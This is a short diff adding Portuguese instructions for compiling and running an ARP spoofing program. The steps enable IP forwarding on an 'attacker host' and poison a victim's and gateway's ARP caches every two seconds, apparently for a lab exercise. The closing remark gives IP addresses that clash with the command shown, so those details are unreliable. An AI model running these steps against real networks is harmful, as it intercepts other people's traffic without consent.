@@ -1,0 +1,21 @@
+
+# Compilar o programa:
+
+make
+
+# Habilitar o encaminhamento de pacotes (roteamento) no host atacante:
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+# Excutar o programa no host atacante:
+
+TF:
+./arpspoof -v -g 10.0.0.1 10.0.0.10 -r 2
+
+
+Obs: nesse caso o endereço IP do gateway é 10.0.0.11 e do host
+vitima é 10.0.0.11. O programa envia um ARP reply não socilitado
+a cada 2 segundos.
+
+
